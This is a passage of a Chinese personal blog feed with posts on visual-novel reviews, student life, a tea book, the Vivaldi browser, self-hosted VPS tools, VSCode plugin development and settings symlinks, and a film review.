##剧情解析 故事的开场有些奇怪，主角在一个公园里解决一桩人与太转依的纠纷时，被本作钦定女主<strong>琥珀</strong>看到了。琥珀便迅速向男主求婚。琥珀的身份是神社的老大的女儿。一种浓浓的霸道总裁爱上你的感觉。接着就是日常白开水，顺便解释一下琥珀为什么一定要嫁给男主（很呼应<strong>you are the only one</strong>）。琥珀继承了她父亲和母亲的理想，希望推广太转依和人类和平共存的理念。由于看到男主积极调解人和太转依之间的矛盾，所以希望和男主结为夫妻，继续发扬这种理念。琥珀向男主求婚的原因在共通线中解释的很清楚。共通线也花了很多的篇幅去渲染，解释琥珀的理念。男主 并没有当场拒绝求婚，他需要时间考虑一下（虽然结婚好重要的，但是对方可是镇子里老大的千金）。此时琥珀的妈妈，真白小姐邀请男主住进神社，希望增进他和琥珀间的交流，男主能早日做出决定。
<center>
<img class="lazyload" data-src="/static/images/tayutama-2.png" height="80%" width="80%">
</center>
<p>此时男主班级里有一个很完美的大小姐，绯文（当地地主家的大小姐，虽然是地主家领养的）。绯文在谁面前都是大小姐的完美模样，唯独在男主面前会展现出真正的自己。还有一个可攻略的女主叫菜乃，她出场较晚，共通线并没有她多少戏份。在跟她有关的事情中，她都是站在了男主的对立立场上。她有着和琥珀完全不同的信念-太转依应该有自己的生活方式。照理来说。她害羞又内向，翻不起什么浪。但是她的后台是一个叫龙子的太转依-战斗力爆表。</p>
<p>共通线的落幕以反派的登场为信号。一个不知道哪儿冒出来的反派，潜入到正派的大本营捣乱。然而最后并没有发生什么。反派没有暴露出自己的位置，正派也没有什么损失，反而是给男主他们很好地上了一节社会实践课。让男主们看到惊慌失措下的镇子，这个所谓试点镇子的本质。反派的存在感和计划是真的差。在骚乱的开始，真白还给反派奶了一口：反派很强大，真白有点慌。然而到骚乱结束，反派都没有露过脸，并且除了一开始的行动，反派也没有任何后续的行动。</p>
<p>整个共通线，给人感觉节奏不够紧凑，没有波折，平淡才是主旋律。共通线中做的最好的一块是对琥珀理念的阐述，以及她为理念付出的努力。我在玩的时候觉得剧情有一点白开水，但是放下游戏，静心体会，琥珀的成长浮现在了眼前。琥珀的坚持，琥珀的努力都已经打动了我。</p>
虽然琥珀是本作钦定的女一号，但我还是选择绯文。绯文线的故事还是很不错的，有不错的伏笔，不错的高潮和不错的结尾。在绯文线中，绯文的真正身世得以揭晓。个人线开端的节奏略微有一些慢。绯文晚上一直在做噩梦，真白小姐知道了这些件事情后，非常重视，希望为绯文诊断一下。个人线的前期便在绯文为了不让男主担心，而不断推迟诊断中度过。随着噩梦的增多，绯文最终发现了自己的真正身份以及过去所犯下的罪行。绯文因为这个罪行消沉了很长一段时间，在男主的鼓励与支持下她选择向众人坦白她的过去。剧情的高潮便是真白小姐对绯文所犯下罪行的宣判。
<center>
<img class="lazyload" data-src="/static/images/tayutama-3.png" height="80%" width="80%">
</center>
<p>这一段，不论是脚本中的逻辑还是情感都很不错。无论是从行为还是语言上来看，各方都非常好的阐述了自己的立场。但是整个事情的起始点-绯文的罪行不能够引起玩家的共鸣。我玩的时候，就并不能理解她为什么会因为这样一个小小的罪行而不断沉沦下去。</p>
琥珀线我打了一半。整条线的前期就在不断的灌水中度过。唯一让我眼前一亮的是这部作品把膝枕换成了尾巴枕头。
<center>
<img class="lazyload" data-src="/static/images/tayutama-4.png" height="80%" width="80%">
</center>
作为背本作钦定的女主角，琥珀线的优势在于情感能够圆润的从共通线过渡到琥珀线。让我感觉到男主接受琥珀，爱上琥珀是一件十分自然的事情。反观绯文线，情感的转换略有生硬。绯文突然就喜欢上了男主，并且成天在患得患失中度过，大小姐的风度荡然无存。
<center>
<img class="lazyload" data-src="/static/images/tayutama-5.png" height="80%" width="80%">
</center>
<h2 id="人物评价">人物评价</h2>
<p>相比于本作钦定女主角琥珀的开朗，纯真与坚持，我更倾向于绯文。绯文的神秘，端庄，以及和男主独处时不断地打趣，开玩笑更加吸引我。</p>
<p>在整个故事中，玩家可以看见琥珀的成长。从一个莽莽撞撞的小女孩，变成一个在实现自己理想道路上不断前行，并且愿意去包容其他异见的合格神女。</p>
<h2 id="cv">CV</h2>
<p>整个游戏里给我留下最深印象的CV是琥珀的CV。她的声线给我一种很稳的感觉，就像琥珀一样。琥珀作为太转依已经活了很长的时间，但是作为人类却没有经历过时光的洗礼。她很稳，但是又很活泼，为自己的初心而奋斗着。另一个CV便是粉桃的CV了。虽然出场次数不多，但是给人干净，活泼的印象。</p>
<h2 id="作画以及系统">作画以及系统</h2>
整个游戏的系统很美观实用。尤其是书签功能，让各条线路和章节以清楚明了美观的方式呈现在读者眼前。
<center>
<img class="lazyload" data-src="/static/images/tayutama-6.png" height="80%" width="80%">
</center>
人物的眼睛非常的漂亮，有光彩。在对话中，可以看到太转依的耳朵和尾巴会时不时的动两下。要吐槽的便是艾米丽等龙套的作画，实在是有点崩。感觉是几个女主的脸扣下来，然后把发型和眼睛拼上去。还有个非常漂亮的角色，粉桃。但是这一作并没有她太多的戏份，在FD中有她的路线。
<center>
<img class="lazyload" data-src="/static/images/tayutama-7.png" height="80%" width="80%">
</center>
<hr>
<center>
<img class="lazyload" data-src="/static/images/tayutama-gift.png" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
      </tags>
  </entry>
  <entry>
    <title>夏天与假期</title>
    <url>/posts/ecd98a04/</url>
    <content><![CDATA[<p>说起暑假，我就想起了summer。summer又让我想到最近key社的新游戏，summer pocket，脚本staff里可是有新岛夕哦。 <a id="more"></a></p>
<p>暑假也是过了一个月了，接下来还有3个月。3个月看似长，其实整个暑假已经过去1/4了。在暑假的前两个礼拜，我过着一天12个小时左右的游戏时间。最近，我实在是遭不住这种生活。这样光打游戏，不学习，我会有一种焦虑情绪。因此后来几天，我在游戏后的零碎时间中，会看一会书。但是这样不够，我还想写网站，我还想做混音，时间不够用，于是我渐渐的开始减少打游戏的时间。</p>
<p>有了更多得时间，我却有了挖更多坑的欲望。我要练字，我要花切，我要渗透。或许我可以把精力专注在两件事情上，但是这么多的事情齐头并进是不可能的。于是为了矫正方向，每过一周，我都会回顾一下我的足迹，简单的规划一下下一步该往哪儿走，不让我自己滑到另一个坑里。<strong>不忘初衷</strong>。</p>
游戏方面，我也在收紧范围，努力地把库里的游戏打通关，之后做一下感想。我库里有不少的文字类游戏，都需要静下心来好好的看完它。至于其它目标，我想在暑假接一些有偿的混音，看看能不能给我自己挣个买声卡的钱。个人网站也准备翻新一些，多增加一些功能，熟悉一下前端和后端框架。毕竟WEB渗透什么的也要求有扎实的WEB基础。
<hr>
<center>
<img class="lazyload" data-src="/static/images/summer-gift.png" height="50%" width="50%">
</center>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
      </tags>
  </entry>
  <entry>
    <title>茶叶百科</title>
    <url>/posts/9259de3c/</url>
    <content><![CDATA[<p>茶叶百科这本书。。。内容真的是百科。 <a id="more"></a></p>
<p>之前去杭州，逛了逛 布兰兔的茶。挺喜欢这种温馨的欧洲童话风格的装饰。在结账时，我注意到收银台后的墙壁上的架子上放着一本<strong>茶叶百科</strong>。想到茶已经是我生活中的一部分了，我却不怎么了解茶。我便买了一本，读了一下。</p>
<p>整本书都是彩印的，看着挺漂亮的。读完整本书，感觉书的确是百科,就是那种什么都讲到了，但讲的都不深，而且有点啰嗦的百科书。</p>
<p>书分这么几个部分。第一部分介绍茶叶的种类（红茶，绿茶，白茶等），茶树生长相关的知识（生长环境，周期等）,制茶的工艺（传统及现代不同种类茶的做法）以及如何品茶。第二部分介绍全球各国茶叶的出口量，特色及饮茶习惯。第三章介绍草本茶。第四章介绍各种拼配茶，鸡尾酒，茶饮的做法。</p>
<p>这本书没设么特别好说的，第二部分看的我快睡着了。感觉看了许多内容，实则没有记住什么。整本书只是讲解了非常基础的茶叶常识，最后的菜谱占了小半本书（菜谱没什么用对我来说）。</p>
总结一下，这本书内容虽然广但是过于简单，叙述有些枯燥。
<hr>
<p><img class="lazyload" data-src="/static/images/teagift.png" sizes="50%"></p>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>天色天歌天籁音</title>
    <url>/posts/f6d0d0c/</url>
    <content><![CDATA[<p>谁敢反对华哥，我就打爆他的狗头。 <a id="more"></a></p>
<p>这一作是“9-nine”系列的第二章。本来我在想要不要先去玩第一章，“九次九日九重色”，毕竟世界观都是一样的。我翻了了一下评论，似乎第一章叙事不咋的。第二章相比第一章有着不小的进步。那我就直接开始玩第二章了。</p>
<p>9-nine系列是一个与异能有关的故事。在一次地震中，神社中封印异界和地球通道的神器坏了。异界和地球之间的通道就此打开。异界中的‘Artifact’进入了地球。拥有‘Artifact’的人会拥有异能力。嘛，接着就有一些人用‘Artifact’做一些坏事情。正好也有隶属于‘Artifact’管理机构-生命之树的异界居民苏菲缇娅拜托主角，翔收集遗失的‘Artifact’。第二章和第一章的主线是一样的，都是去追查‘魔眼’-一个拥有将其他人变成石像能力的异能者杀人犯。也就是说叙事时间线上来讲，第一章和第二章的时间线是完全一样的呢。简单来说，第一章和第二章就是两个不同的分支。每一章都只有一个可攻略的女主。这么一说，感觉这两章并在一起也没问题啊。就是两个不同的女主线。</p>
<p>第二章留下了更多的谜题，对于‘Artifact’的来历（第二章就提到这玩意和它的名字一样，是人造的），异界的来历（据说很久以前异界和地球同属于一个分支），男主的能力，苏菲缇娅的真正目的，男主基友的目的等等。</p>
<p>第二章整体来说，就是在第一章原有的主线上演绎出了不同的分支。对于‘Artifact’的调查并没有什么实质上的推进。男主他们获取情报的方式也较为单一，只从苏菲缇娅的口中获取。苏菲缇娅说话又跟挤牙膏一样，不知道在哪里就留一些关键的事情不提。</p>
<p>天色天歌天籁音的开头耐人寻味，翔忘记了天，开始回溯记忆-“游戏开始”。那么真正的时间线到底在哪里呢？翔和妹妹天的感情主线是天的‘Artifact’失控。天的‘Artifact’是控制一个人的存在感。由于翔的抗性比较高，其他人都渐渐忘记了天，只有翔还记得。但是翔终究会忘记。唯一的希望是苏菲缇娅的药剂-可以让人和“Artifact”解除契约。做药剂毕竟要时间的嘛。随着时间的推移，天失控的能力还会作用到翔身上，其他人也渐渐的忘记了翔。这个故事有没有点耳熟？《纸上的魔法使》中的《蓝宝石的存在证明》。随着能力的失控，天渐渐表达出了对翔的喜爱。翔。。。。我说不下去了，这个感情线是真的糟糕，扯淡。连翔到底爱不爱天我都搞不清。天为了说服翔做一次她的恋人，她的论证是真的疯狂。她直接用出了道德绑架，与其说是说服，不如说是恐吓。</p>
<p>这个游戏的世界观设定本来是挺不错的，但是主线的推进实在是有些缓慢啊。脚本还照例在游戏最后挖一个坑，暗示男主的基友和苏菲缇娅有关系。CG数量也是少的可怜，唯一可以称道的就是翔和妹妹天的日常对话。与《纸上的魔法使》中月社妃冷静的讽刺，四条琉璃不还嘴不一样。天和翔可是互相杠上的，互相吐槽挖苦。天的语气也是时而撒娇的语气，时而厌恶的语气，时而无奈的语气。可以说华哥赋予了这个角色灵魂，真的是吹爆。大概这就是元气满满，古灵精怪的形象吧。学姐的语音音量有一点问题，即使学姐的人格切换了以后，音量仍旧太轻。</p>
<p>关于天这个角色为什么这么棒呢。我思考了一下塑造一个角色的要点。我觉得是用矛盾去堆砌，才能让一个角色站起来。只有矛盾，才能展示人的品格。就像Hello Lady做的那样。可以说在天身上隐约的可以看到这个矛盾-对于翔的感情。天平日里对翔又是吐槽又是挖苦又是撒娇，但在关键时刻可是对翔关心的不得了。但是在翔身上，矛盾就没有这么明显了。嘛，毕竟是男主，需要透明一些也是可以理解的。但是这个男主可是有配音的，感觉作者是想去真正的展现翔这个人物的。而且翔的心理描写可是有一些少。这就有些糟糕了，这种妹控题材该有的主题没有被充分的挖掘。可能考虑到不能喧宾夺主吧，重头戏可是异能。</p>
<p>天很棒，剧情不行。作画上，眼睛画的很绚丽。</p>
<hr>
<center>
<img class="lazyload" data-src="/static/images/tstgtly-gift.png" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
      </tags>
  </entry>
  <entry>
    <title>Weclome to 大学</title>
    <url>/posts/338b3d40/</url>
    <content><![CDATA[<p>又是新的校园，似乎有些不同，但是大体还是那样呢。先来说说不同吧。</p>
<a id="more"></a>
<p>步入了大学生活，的确感觉和高中有了很大的不同。</p>
<p>先说说社交吧，不知道大学是不是一个令你感到浮躁的地方。每天你都见到，认识更多的人，但是对于很大一部分人，你并没有机会去深入了解他们。下次见到他们，你可能都不能够认出他们。在大学，社交完全在于你自己的能力。机会，并不会限制你。因为每天你都会遇到很多的陌生人。在高中，课堂的规模和流动性更小，同学们有更多的机会去了解彼此。但是在大学，每个人的课表都是不一样的。你或许有机会认识人，但是后续如何持续与新认识的人走近，就完全在于你自己的社交能力了。主动，在大学十分重要。但是到底应该走近谁，走多近，花费这么多时间走近真的值得吗？但不论如何，一句‘what's up man’还是必不可少的。</p>
<p>还有一个比较特殊的地方在于，我学校充斥着各种各样的part。每天都会有party，大学旁边的住宅区更是夜夜笙歌。从蹦迪到concert应有尽有。（虽然我都不喜欢）我更喜欢小规模的那种，三两个人聚在一起玩。倒无所谓是不是熟人，毕竟人这么少，玩着玩着就熟悉了。</p>
<p>没有了一个人单独的房间，总感觉游戏也不能静下心来好好欣赏。而且总觉得宅在宿舍是一个最差的选择，使人感到焦虑。走出房间，去和不认识的人或是认识的人一起玩都比宅好很多。毕竟这是party school。</p>
<p>我也算初次体会到了上大课的那种感觉。令人犯困。我觉得主要原因还是因为音响，和教室（礼堂）的声装太差。本来麦克风的效果就一般，音箱中传出了闷闷的声音。再加上礼堂一般的声装，高频被墙壁吸收，声音显得更加的闷。这样自然也让人犯困了。</p>
<p>大概就先这些，下次再来感受一下和高中比起来没有改变的地。</p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
        <tag>大学</tag>
      </tags>
  </entry>
  <entry>
    <title>Vivaldi</title>
    <url>/posts/73a89d73/</url>
    <content><![CDATA[<p>Vivaldi 比原生的 Chrome 好用太多了。</p>
<a id="more"></a>
<p>第一次听说 Vivaldi 是在<a href="https://saber.love/vivaldi-浏览器.html">saber 酱的抱枕</a></p>
<p>一开始抱着 Chrome 天下第一，Canary 天下无敌的想法。看着看着，想法就改变了。</p>
<p>Vivaldi 据说是 Opera 的创始人做的浏览器，用的是 Chromium 内核。因此兼容 Chrome 的插件。在原来 Chrome 浏览器的基础上，它集成了不少小功能。原本这些小功能在 Chrome 浏览器上都是通过插件进行集成的。</p>
<p><a href="https://vivaldi.com">官网</a></p>
<h2 id="美观">美观</h2>
<p>其实这点问题不大。Vivaldi 内部集成了几个主题，用户也可以通过改变颜色来自定义一些配色方案</p>
<h2 id="标签">标签</h2>
<p>标签是 Vivaldi 主打的功能。很多原生 Chrome 没有，需要第三方插件实现的功能。</p>
<ul>
<li><p>TabBar 的位置是可以改变的。你可以把它放到左边，右边上面，下面甚至隐藏。</p></li>
<li><p>当你将鼠标悬浮在 TabBar 的 Tab 上面时，可以显示出缩略图。</p></li>
<li><p>支持 shift，control 对标签进行多选。</p></li>
<li><p>对于未读的 Tab 会在标签的右上角有标记。</p></li>
<li><p>可以将多个 Tab 合成成为一个 Tab,有点类似 Tab 分组的功能。也可以新的标签一打开就与相关标签自动合并。</p></li>
<li><p>支持 Tab 自动休眠，最大化的节省内存。</p></li>
<li><p>可以将 tab 整理为一个 session 进行保存。</p></li>
</ul>
<h2 id="底栏">底栏</h2>
<p>底栏上添加了很多工具。</p>
<ul>
<li><p>打开在其他设备上打开的标签页</p></li>
<li><p>页面截图（以前这个是通过插件集成的）</p></li>
<li><p>标签多开。在一个浏览器窗口上或平铺，或水平分割来显示多个页面。</p></li>
<li><p>阅读模式</p></li>
<li><p>各种滤镜（灰白等等）</p></li>
<li><p>各种调试工具（css 调试，hover 调试）</p></li>
<li><p>还有一个好用的侧边栏（webPanel）。算是标签多开的副产品。可以让你快捷的在窗口左侧以移动设备的视图打开一些标签页。比如做数学题的时候，可以非常方便的打开计算器。</p></li>
</ul>
<h2 id="其他">其他</h2>
<h3 id="历史功能">历史功能</h3>
<p>历史功能做了很大的优化，增加了统计功能。可以很清晰的看到自己一天看了多少标签页。在哪个时间看的最多（月，日都可以）。一天中打开的链接是什么形式的，是直接输网址，还是通过自动补全的。浏览的最多的域名是什么。看看还是挺震撼的，我一天可能要在三四百个页面看七八百次。</p>
<h3 id="笔记">笔记</h3>
<p>浏览器集成了笔记功能。很方便的把页面，选中的字加入笔记。可以在侧边栏（webPanel）快捷的查看笔记。</p>
<h3 id="快速命令">快速命令</h3>
<p>就跟 VsCode 的<code>control+shift+P</code>一样。可以在里面输入命令，完全可以替代地址栏，标签栏。插件对与快速命令的支持倒是一般。</p>
<h3 id="手势">手势</h3>
<p>原生支持手势，这个就没必要多说。</p>
<p>总的来说，原生支持了很多插件实现的功能。并且将他们有序的排放在浏览器的 UI 中。不像插件一样，挤在那个小小的右上角。</p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Browser</tag>
        <tag>Recommendation</tag>
      </tags>
  </entry>
  <entry>
    <title>我拿 VPS 来干什么</title>
    <url>/posts/693c10/</url>
    <content><![CDATA[<p>从一开始不知道在 VPS 上跑什么服务，到现在 VPS 上跑满服务。</p>
<a id="more"></a>
<p>随着容器技术的成熟，部署软件和维护 VPS 不再像以前那么复杂。以前的软件大多是直接跑在 VPS 上，我们要为其设置反向代理，安装 Nginx。在软件安装的时候也很容易出错。现在很多软件都支持用 Docker 安装。稍微修改一下配置文件，我们就可以一键启动容器了。服务相互之间隔离，管理 Docker 可比之前折腾直接装在本机上的软件方便多了。那么我们具体应该怎么管理 VPS，VPS 上又有什么有用的软件可以安装呢？</p>
<h1 id="vps-管理">VPS 管理</h1>
<p>首先介绍几个提升 VPS 使用体验的软件。他们分别是 VSCode,Ansible,Htop,Portainer,Nginx-Proxy,Netdata。</p>
<h2 id="vscode">Vscode</h2>
<p>自从 VSCode 推出了远程 SSH 功能，在 VPS 编辑文件一下子变得方便了起来。编辑文件的同时还有 Terminal，还有文件树。如果安装了 Docker 插件，我们还可以轻松的管理容器。不过需要注意的是在 1G1C 的 VPS 上可能跑不动 VSCode。</p>
<h2 id="ansible">Ansible</h2>
<p>我曾在第 35 周提到过 <a href="https://www.inevitable.tech/posts/1c32c9b8/">Ansible</a>，一个自动运维工具。我们可以将常用的操作写成 Ansible Playbook 以重复使用。比较好的习惯便是执行一个操作遍将其写成 Ansible Playbook，保证它的可重复性。</p>
<p>Ansible playbook 某种意义上与<code>docker-compose.yml</code> 有重叠。例如我们在<code>docker-compose.yml</code>中有两个 service，Nginx 和 Portainer。我们既可以在 Ansible playbook 中直接调用这个<code>docker-compose.yml</code>，也可以将 Nginx 和 Portainer 分别写进 Ansible playbook，不再用到 docker-compose.yml。这么做各有利弊，<code>docker-compose.yml</code>更方便进行分享。写进 Ansible playbook 中则更加灵活，方便后续修改和使用。</p>
<p>目前唯一的缺点是 Ansible 不支持 Windows，我们需要在 WSL 或 Docker 中运行 Ansible。</p>
<h2 id="htop">Htop</h2>
<p>一个来查看系统资源的 Linux 命令。可以展示 CPU，RAM，进程占用系统资源的信息。它也支持过滤和搜索，可以展示特定的某些进程的系统资源使用。</p>
<h2 id="portainer">Portainer</h2>
<p><a href="https://www.portainer.io/">Portainer</a> 是一个容器管理软件。它有一个 WebUI，让我们可以在 Web 界面管理 VPS 上的容器。以前删除一个容器，我们需要先找到容器的 ID，然后停止它，最后删除它。在 Portainer 上我们可以一键移除容器，并且可以方便的删除现有容器不在使用的 Volume。除了管理容器，Portainer 也可以用来部署容器，给容器分组等等。</p>
<h2 id="nginx-proxy">Nginx-Proxy</h2>
<p>为了可以用域名访问到这些在不同端口的服务，我们需要一个反向代理。反向代理会帮助我们将进入的流量转发到对应的服务中去。</p>
<p><a href="https://github.com/nginx-proxy/nginx-proxy">Nginx-Proxy</a> 就是这样一个软件可以帮助我们将流量自动转发到运行在 Docker 中的服务去。这算是配置非常简单的网络服务软件。如果需要额外的 SSL，可以使用配套的 <a href="https://github.com/nginx-proxy/docker-letsencrypt-nginx-proxy-companion">docker-letsencrypt-nginx-proxy-companion</a>。照着教程走就可以完美完成设置。需要注意的是如果你用 Cloudflare 做 DNS，记得关闭 Proxy 模式，用 DNS Only 模式。</p>
<h2 id="netdata">Netdata</h2>
<p>一开始认识到的资源监控软件是 Grafana。Grafana 的灵活度更高但是做不到开箱即用，而且还需要安装额外数据库。因此最后我使用过的是轻巧的 <a href="https://github.com/netdata/netdata">Netdata</a>。Netdata 可以做到开箱即用并且展示了大量的系统资源数据。由于展示的数据过多，会显得有些杂乱。</p>
<h1 id="我在用的软件">我在用的软件</h1>
<h2 id="tinytinyrss">TinyTinyRss</h2>
<p>大家都在用的 RSS 服务。其缺点还是很明显的，很多 UI 设计比较过时，软件较为臃肿占用较多的资源。</p>
<h2 id="huginn">Huginn</h2>
<p><a href="https://github.com/huginn/huginn">Huginn</a> 是一个自动化软件。用起来有点类似 IFTTT。</p>
<p>如果要使用 Huginn 的邮箱服务，我们需要为其 Docker 添加跟 SFTP 有关的环境变量。具体例子 <a href="https://github.com/huginn/huginn/blob/master/.env.example">在这</a>。</p>
<h2 id="netease-music">Netease music</h2>
<p><a href="https://github.com/nondanee/UnblockNeteaseMusic">UnblockNeteaseMusic</a> 用来在海外解锁灰掉的网易云音乐。</p>
暂时就这些，仔细一整理发现 Devop 的软件比真正干活的软件要多。最后附上我的<code>docker-compose.yml</code>。
<script src="https://gist.github.com/glazec/1f8450a05981e615de92bdd6172ff2ee.js"></script>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>VPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Vscode 插件开发-HexoHead</title>
    <url>/posts/3fef5fe0/</url>
    <content><![CDATA[<p>Vscode还是挺好用的，但是开发经历却。。。 <a id="more"></a></p>
<h2 id="vscode使用">Vscode使用</h2>
<p>最近从Pycharm IDE换成了Vscode。理由如下： * 插件数量和种类 * 主题 * 重量 * 支持更多的语言 * 更多的使用场景 当然，我之前开发Android App的时候还是用的Android Studio。</p>
<p>以前我写python比较多，所以用Pycharm。但是现在我什么语言都会去写一点点。这样不管什么东西，我都能够写一点。各种语言的基础语法还是很容易上手的。比如我最近就写了一些JS，HTML，CSS，TS。这是我使用编辑器的一个原因。那为什么我不去选择那些老牌编辑器呢，比如Vim和Emacs又或者Atom呢？</p>
<p>Vim的快捷键我很喜欢。这样分不同的编辑模式，更加依赖于单键快捷键而不是组合键的想法很符合我的习惯。</p>
<p>隔壁Emacs中函数式编程语言Lisp是我喜欢的点。函数式编程是信仰，但是函数式编程在日常开发中没有很多使用机会。的确Coljure可以开发web，但是这种方式并不大大众。Emacs或许是一个很好的使用Lisp的地方。</p>
<p>Atom算是一个现代的编辑器。它的插件也很多。我之前使用的时候，遇到过插件太多，出现冲突以及由于插件太多导致启动速度过慢的问题。</p>
<p>Vscode是微软新出的一个编辑器。这么一说微软现在旗下有两款编辑器？一款原来属于Github的Atom，还有Vscode。对于我来说，Vscode的优势在于对Windows平台优秀的支持以及现代化的插件。Vscode背靠微软，对微软的产品支持极佳。用户可以非常方便的部署Azure。可别忘了，现在Github也被微软收购了。Vscode对Github的支持也是很棒。比如Inline Diff，又或者在Command Platte进行Git的各种操作。</p>
<p>大部分常用插件Vscode都有，只记得有一回我找不到想要的插件。那一次我使用Phaser库，但是写代码的时候没有自动补全。我便去找Phaser的插件，但是我并没有找到。</p>
<p>要说它的缺点，那可能是快捷键了。它的快捷键不如老牌编辑器那么好用。虽然有插件，但是像Vim这样的快捷键，不通过原生支持，很难去展现它的精髓。毕竟大多编辑器都是以组合键为主。但也不必担心，大多数的操作都可以在Command Platte中实现。只要手不用离开键盘，都是好的快捷键实现。</p>
<h2 id="插件开发">插件开发</h2>
<p>我平时写Hexo博客习惯自己新建一个文件，因此文件头每次都要重写一遍，很麻烦。如果使用官方的命令行创建草稿，Tag和Category不会显示候选项。很容易写错Category的名字，比如除了Tech这个标签，还多了一个叫tech。这些问题都是我这个插件想要解决的。</p>
<p>插件Github地址-&gt;<a href="https://github.com/glazec/hexo-post-head-generator">传送门</a> Vscode插件地址-&gt;<a href="https://marketplace.visualstudio.com/items?itemName=glaze.hexo-post-head-generator">传送门</a> 现在还有一些小bug没修。</p>
<p>就整个开发体验来说，一般。文档没有Android多，社区的资源也不多。但是我在查找Vscode插件开发的资料的时候，我看到的博客都在清一色地吹Vscode的API有多好用，有多清楚。</p>
<p>的确官方API文档写的还算清楚，方法，类都列了出来。但问题是有些Class是不能直接创建的，比如一个代表Current Window的Class，你得用函数获得,不能自己创建。这些点在官网中都没体现出来。所以开发的时候，我就遇到不少坑，明明这个Class在官方API中提到过，我怎么不能把它实例化。</p>
<p>之后，我一般都在API文档里找我需要的API后，去Github上参考一下别人是怎么调用这个API的。</p>
<p>这算是我第一次使用Typescirpt，第一次接触回调和异步。写不明白。这儿缺一个回调，“Promise not handled in one second”；那儿写了一个await，但是发现await根本不理我，我没有得到我想要的数据。上网查查资料，却觉得自己并没有写错。我不断的把代码重排序，也终于算是写出来了。</p>
<p>整个代码就像一个Snippet。但是Vscode的Snippet暂时不支持执行bash代码，我也就用这种方式来解决我的问题。Tag和Category的获取便是遍历一遍_posts文件。一开始我还想把遍历Posts的模块独立出来，单独写一个Refersh Posts。我怕集成在一起，每次插入个文件头需要很多时间。这大部分时间都在遍历文件上。但是经过实际测试，速度还行，便没有独立出来。</p>
<p>正式版发布前我便是准备把已知的一些Bug修复，顺便看看能不能增强一下补全功能-对于多个Tag和Category都可以进行补全。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>VsCode</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode预览版和稳定版共享配置</title>
    <url>/posts/9a3db390/</url>
    <content><![CDATA[<p>很多时候都没有必要使用一个软件的预览版，但是一个契机却出现了。 <a id="more"></a></p>
<p>在微软开发者大会上，微软宣布了远程开发的插件。开发者再也不用面对着只有黑框框的Docker容器和SSH了。不用被迫使用Vim，在黑框框中编辑文件。不用为上传和下载文件进行烦恼，不用为端口映射而操劳。现在，借助远程开发这一系列的插件，我们可以将Vscode和我们的容器或者云服务相连。文件浏览，自动补全，还有窗口管理，方便的终端管理，远程Debug，一切都不是梦想。</p>
<p>这个系列的插件还在最后的开发和调试之中，想要使用得用Vscode-insider也就是预览版。预览版和稳定版是两个完全不同的安装程序，他们有不同的安装目录，插件目录和配置文件。如果想要让他们统一，可以用软链。</p>
<p>Windows上使用软链的命令是<code>mklink</code>。以下是把为vscode插件目录和配置文件进行软链的命令。 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mklink C:\Users\username\AppData\Roaming\Code - Insiders\User\settings.json C:\Users\username\AppData\Roaming\Code\User\settings.json</span><br><span class="line">mklink \D C:\Users\username\.vscode\extensions C:\Users\username\.vscode - Insiders\extensions</span><br></pre></td></tr></table></figure> 这样就会自动生成软链，vscode和vscode insider共用一个配置文件和插件目录了。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>VsCode</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>天气之子</title>
    <url>/posts/d58267cf/</url>
    <content><![CDATA[<p>《天气之子》是一个比《你的名字》更符合我口味的电影。</p>
<a id="more"></a>
<h2 id="画面">画面</h2>
<p>这次的故事发生在东京,繁华的都市与密集的建筑物。或许你会想起《你的名字》中光线在建筑物外表反射，折射，最后构造出绚丽的光影。在《天气之子》中，大部分时候是阴天，偶尔有的也只是小范围的晴天。阴天的大都市塑造了整部电影阴暗压抑的感觉。</p>
<p>这一次画面的重点在于天气-雨。精确点说就是流体。雨水在画面中的形状，雨水砸在物体上的弹跳，光在雨滴中的反射和折射。仔细看了看，这些雨滴说不上真实。因为光在水中的反射和折射不够真实，以及缺少气泡，飞沫和浮沫。这三个元素是很多流体模拟都缺少的，却很难被发现。但这些雨滴都很美，有着独特的风格。他们还在某种程度上反映了人物的心理活动。比如下面这个场景，男主在被别人打的时候犹豫要不要把枪拿出来。</p>
<center>
<img class="lazyload" data-src="/static/images/weatheringwithYou2.png" height="80%" width="80%">
</center>
<center>
<img class="lazyload" data-src="/static/images/weatheringwithYou3.png" height="80%" width="80%">
</center>
<p>雨水在这一个片段中通过溅射的运动赋予场景表现张力。这一拳头的打击感十足正是因为男主的脸和地面亲密接触溅射出无数的水滴。</p>
<center>
<img class="lazyload" data-src="/static/images/weatheringwithYou4.png" height="80%" width="80%">
</center>
<center>
<img class="lazyload" data-src="/static/images/weatheringwithYou5.png" height="80%" width="80%">
</center>
<center>
<img class="lazyload" data-src="/static/images/weatheringwithYou6.png" height="80%" width="80%">
</center>
<p>雨滴打在男主的脸上，体现了时间的流逝。这冰冷的雨滴也打在了男主的心里，催促他做出选择。</p>
<blockquote>
<p>冷冷的冰雨在脸上胡乱的拍 暖暖的眼泪跟寒雨混成一块 -刘德华《冰雨》</p>
</blockquote>
<p>下面是一些光影有关的场景。</p>
<center>
<img class="lazyload" data-src="/static/images/weatheringwithYou7.png" height="80%" width="80%">
</center>
<h2 id="故事">故事</h2>
